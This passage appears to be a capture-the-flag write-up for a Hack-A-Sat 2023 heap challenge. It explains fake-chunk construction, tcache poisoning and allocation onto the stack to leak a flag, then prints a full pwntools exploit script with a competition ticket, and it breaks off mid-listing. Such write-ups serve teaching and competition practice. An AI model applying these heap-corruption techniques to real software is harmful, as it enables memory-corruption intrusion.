+<p>Since we later want to overwrite parts of the fake chunk, we write a utility function for this. In order to alter the fake chunk, we first have to change the contents of the big chunk that contains the start of the fake chunk. As the big chunk is not needed afterwards and since we may want to reallocate it later for other changes to the fake chunk, we can free it directly afterwards.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">change_fake_chunk</span>(con: tube, size: int, forward: int, backward: int<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>) <span style="color:#f92672">-&gt;</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> flat({
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># size</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">0x388</span>: size <span style="color:#f92672">|</span> <span style="color:#ae81ff">1</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># forward, backward</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">0x390</span>: forward,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">0x398</span>: backward,
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># prev size</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">0x3c0</span>: size,
+</span></span><span style="display:flex;"><span>        })
+</span></span><span style="display:flex;"><span>    post_message(con, <span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">True</span>, payload<span style="color:#f92672">.</span>hex()<span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;0&#34;</span>)
+</span></span><span style="display:flex;"><span>    recv_message(con, <span style="color:#ae81ff">0</span>)
+</span></span></code></pre></div><p>After preparing the fake chunk, we can now free the 0x100 chunk that we saved for later. As it cannot be freed into tcache since it is full, it will be merged with the prepared fake chunk and the resulting chunk will be appended to the unsorted bin.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">create_fake_chunk_0x140</span>(con: tube, base_address: int) <span style="color:#f92672">-&gt;</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># allocate second Node object outside first big chunk</span>
+</span></span><span style="display:flex;"><span>    post_message(con, <span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">True</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;f&#34;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">0x781</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>))
+</span></span><span style="display:flex;"><span>    post_message(con, <span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">True</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;f&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">1001</span>)
+</span></span><span style="display:flex;"><span>    recv_message(con, <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>    recv_message(con, <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    post_message(con, <span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">True</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;f&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x1e9</span>)
+</span></span><span style="display:flex;"><span>    post_message(con, <span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">1</span>, <span style="color:#66d9ef">True</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;f&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x1e9</span>) <span style="color:#75715e"># first chunk split from the big one</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># fill tcache</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">6</span>):
+</span></span><span style="display:flex;"><span>        post_message(con, <span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">True</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;f&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x1e9</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">7</span>):
+</span></span><span style="display:flex;"><span>        recv_message(con, <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># unset previous in use flag and prepare fake chunk</span>
+</span></span><span style="display:flex;"><span>    change_fake_chunk(con, <span style="color:#ae81ff">0x40</span>, base_address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x380</span>, base_address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x380</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># trigger merge</span>
+</span></span><span style="display:flex;"><span>    recv_message(con, <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;fake chunk created&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>create_fake_chunk_0x140(io, chunk_3c1_content)
+</span></span></code></pre></div><h2 id="get-a-chunk-on-the-stack">Get a chunk on the stack<a href="#get-a-chunk-on-the-stack" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Now we can move a chunk to the stack. In order to achieve this, we have to overwrite the next pointer of a free tcache chunk with the address of <code>program_invocation_short_name</code> calculated previously when we leaked the address of libc. To furthermore be able to allocate chunks at these addresses, the counter of the tcache bin needs to be adjusted. Since we want to allocate three chunks (our fake chunk, the one in libc and the one onto the stack), we first have to free the fake chunk and two other chunks of the same size to the corresponding tcache bin. Since tcache bins are handled like stacks, i.e. the last chunk freed will be malloced first, our fake chunk must be freed last. To accomplish this, we will malloc the fake chunk in the first pipe and use the second pipe for the remaining chunks. After the tcache bin is prepared with the correct amount of chunks, we can alter the next pointer of the fake chunk with our target. In order to not mess with adjacent chunks, we provide an even amount of hex chunks and thereby don&rsquo;t write the full chunk.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">prepare_malloc_target</span>(con: tube, target: int, size: int<span style="color:#f92672">=</span><span style="color:#ae81ff">0x140</span>) <span style="color:#f92672">-&gt;</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># allocate fake chunk</span>
+</span></span><span style="display:flex;"><span>    post_message(con, <span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">True</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;f&#34;</span><span style="color:#f92672">*</span>((size<span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># allocate + free other chunks</span>
+</span></span><span style="display:flex;"><span>    post_message(con, <span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">1</span>, <span style="color:#66d9ef">True</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;f&#34;</span><span style="color:#f92672">*</span>((size<span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>))
+</span></span><span style="display:flex;"><span>    post_message(con, <span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">1</span>, <span style="color:#66d9ef">True</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;f&#34;</span><span style="color:#f92672">*</span>((size<span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>))
+</span></span><span style="display:flex;"><span>    recv_message(con, <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>    recv_message(con, <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># free fake chunk</span>
+</span></span><span style="display:flex;"><span>    recv_message(con, <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># change next pointer of fake chunk</span>
+</span></span><span style="display:flex;"><span>    change_fake_chunk(con, size, target)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;tcache prepared&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SIZE <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x140</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>prepare_malloc_target(io, stack_pointer, SIZE)
+</span></span></code></pre></div><p>After we prepared and correctly linked the tcache chunks, we can allocate the chunk onto the stack.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># dereference next pointers</span>
+</span></span><span style="display:flex;"><span>post_message(io, <span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">True</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;f&#34;</span><span style="color:#f92672">*</span>((SIZE<span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>))
+</span></span><span style="display:flex;"><span>post_message(io, <span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">True</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;f&#34;</span><span style="color:#f92672">*</span>((SIZE<span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># malloc stack</span>
+</span></span><span style="display:flex;"><span>post_message(io, <span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">1</span>, <span style="color:#66d9ef">True</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;f&#34;</span><span style="color:#f92672">*</span>((SIZE<span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># leak stack</span>
+</span></span><span style="display:flex;"><span>leak <span style="color:#f92672">=</span> recv_message(io, <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>print(hexdump(leak))
+</span></span></code></pre></div><p>Unfortunately, the leak part of the stack does not contain the flag. If we dump the end of the stack in gdb and compare it with our outputs, we notice, that we dumped the area after the flag. In order to dump the flag, we have to shrink our buffer.</p>
+<h2 id="shrink-fake-chunk">Shrink fake chunk<a href="#shrink-fake-chunk" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>In order to shrink the fake chunk, we first have to move it from the unsorted bin to tcache, since allocating and freeing chunks from unsorted bin triggers a bunch of tests that are hard to circumvent in our current situation. In contrast, tcache features much less and much weaker checks, such that we only have to change the size in the header of the fake chunk while it is allocated. For leaking the variable part at the end of the flag, a chunk size of 0x80 with an input of an odd number of hex chars is sufficient, while a chunk size of 0x70 with an even number of hex chars results in the constant front part of the flag being leaked.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">shrink_fake_chunk</span>(con: tube, new_size: int) <span style="color:#f92672">-&gt;</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>    post_message(con, <span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">True</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;f&#34;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">0x138</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>))
+</span></span><span style="display:flex;"><span>    change_fake_chunk(con, new_size, <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>    recv_message(con, <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;shrinked chunk to </span><span style="color:#e6db74">{</span>new_size<span style="color:#e6db74">:</span><span style="color:#e6db74">x</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SIZE <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x80</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>shrink_fake_chunk(io, SIZE)
+</span></span></code></pre></div><h2 id="full-exploit-script">Full exploit script<a href="#full-exploit-script" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Together with the typical pwntools boiler plate code and some adjustments for Hack-A-Sat, we get the full exploit script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># -*- coding: utf-8 -*-</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;tmux&#34;</span>, <span style="color:#e6db74">&#34;splitw&#34;</span>, <span style="color:#e6db74">&#34;-h&#34;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./magic&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>host <span style="color:#f92672">=</span> args<span style="color:#f92672">.</span>HOST <span style="color:#f92672">or</span> <span style="color:#e6db74">&#39;magic.quals2023-kah5Aiv9.satellitesabove.me&#39;</span>
+</span></span><span style="display:flex;"><span>port <span style="color:#f92672">=</span> int(args<span style="color:#f92672">.</span>PORT <span style="color:#f92672">or</span> <span style="color:#ae81ff">5300</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">start_local</span>(argv<span style="color:#f92672">=</span>[], <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw):
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>GDB:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> gdb<span style="color:#f92672">.</span>debug([elf<span style="color:#f92672">.</span>path] <span style="color:#f92672">+</span> argv, gdbscript<span style="color:#f92672">=</span>gdbscript, <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> process([elf<span style="color:#f92672">.</span>path] <span style="color:#f92672">+</span> argv, <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">start_remote</span>(argv<span style="color:#f92672">=</span>[], <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw):
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;&#39;&#39;Connect to the process on the remote host&#39;&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>    io <span style="color:#f92672">=</span> connect(host, port)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>GDB:
+</span></span><span style="display:flex;"><span>        gdb<span style="color:#f92672">.</span>attach(io, gdbscript<span style="color:#f92672">=</span>gdbscript)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> host <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;localhost&#34;</span>:
+</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Ticket please:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;ticket{victor319320juliet4:GJ_fZHwnIpvb_CgZcrCcvo6_sGBEa3lhFg3ihTX6iiX77Ux3yqA5Se8zH7IMpwBy8A}&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> io
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">start</span>(argv<span style="color:#f92672">=</span>[], <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw):
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> start_local(argv, <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> start_remote(argv, <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>gdbscript <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">break send_msg
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">continue
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">delete
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">break __libc_malloc
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">break __libc_free
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">continue
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#f92672">.</span>format(<span style="color:#f92672">**</span>locals())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># -- Exploit goes here --</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">post_message</span>(con: tube, msg_id: int, pipe_id: int, is_hex: bool, msg: bytes) <span style="color:#f92672">-&gt;</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>    con<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt; &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
+</span></span><span style="display:flex;"><span>    con<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;msg_id: &#34;</span>, str(msg_id)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    con<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;pipe_id: &#34;</span>, str(pipe_id)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> is_hex:
+</span></span><span style="display:flex;"><span>        con<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;hex: &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        con<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;hex: &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;0&#34;</span>)
+</span></span><span style="display:flex;"><span>    con<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Message to post on bus: &#34;</span>, msg)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">recv_message</span>(con: tube, pipe: int) <span style="color:#f92672">-&gt;</span> bytes:
+</span></span><span style="display:flex;"><span>    con<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt; &#34;</span>, str(pipe<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    con<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;StarTracker: Testing Message</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    msg <span style="color:#f92672">=</span> con<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34; </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>]
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> bytes([int(byte, <span style="color:#ae81ff">16</span>) <span style="color:#66d9ef">for</span> byte <span style="color:#f92672">in</span> msg<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34; &#34;</span>)])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">leak_libc</span>(con):
+</span></span><span style="display:flex;"><span>    post_message(con, <span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">True</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;f&#34;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">0x3c1</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span><span style="color:#f92672">-</span><span style="color:#ae81ff">3</span>))
+</span></span><span style="display:flex;"><span>    leak <span style="color:#f92672">=</span> recv_message(con, <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>    print(hexdump(leak))
+</span></span><span style="display:flex;"><span>    bin_address <span style="color:#f92672">=</span> u64(leak[<span style="color:#ae81ff">0x3d0</span>:<span style="color:#ae81ff">0x3d8</span>])
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;bin for size of 0x790 is at </span><span style="color:#e6db74">{</span>hex(bin_address)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> bin_address
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">leak_heap</span>(con: tube) <span style="color:#f92672">-&gt;</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>    post_message(con, <span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">True</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;f&#34;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">0x1e1</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>))
+</span></span><span style="display:flex;"><span>    leak <span style="color:#f92672">=</span> recv_message(con, <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>    print(hexdump(leak))
+</span></span><span style="display:flex;"><span>    heap_base <span style="color:#f92672">=</span> u64(leak[<span style="color:#ae81ff">0x1f8</span>:<span style="color:#ae81ff">0x200</span>]) <span style="color:#f92672">&amp;</span> <span style="color:#f92672">~</span><span style="color:#ae81ff">0xfff</span>
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;heap is at </span><span style="color:#e6db74">{</span>hex(heap_base)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> heap_base
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">change_fake_chunk</span>(con: tube, size: int, forward: int, backward: int<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>) <span style="color:#f92672">-&gt;</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> flat({
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># size</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">0x388</span>: size <span style="color:#f92672">|</span> <span style="color:#ae81ff">1</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># forward, backward</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">0x390</span>: forward,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">0x398</span>: backward,
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># prev size</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">0x3c0</span>: size,
+</span></span><span style="display:flex;"><span>        })
+</span></span><span style="display:flex;"><span>    post_message(con, <span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">True</span>, payload<span style="color:#f92672">.</span>hex()<span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;0&#34;</span>)
+</span></span><span style="display:flex;"><span>    recv_message(con, <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">create_fake_chunk_0x140</span>(con: tube, base_address: int) <span style="color:#f92672">-&gt;</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># allocate second Node object outside first big chunk</span>
+</span></span><span style="display:flex;"><span>    post_message(con, <span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">True</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;f&#34;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">0x781</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>))
+</span></span><span style="display:flex;"><span>    post_message(con, <span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">True</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;f&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">1001</span>)
+</span></span><span style="display:flex;"><span>    recv_message(con, <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>    recv_message(con, <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    post_message(con, <span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">True</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;f&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x1e9</span>)
+</span></span><span style="display:flex;"><span>    post_message(con, <span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">1</span>, <span style="color:#66d9ef">True</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;f&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x1e9</span>) <span style="color:#75715e"># first chunk split from the big one</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># fill tcache</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">6</span>):
+</span></span><span style="display:flex;"><span>        post_message(con, <span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">True</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;f&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x1e9</span>)
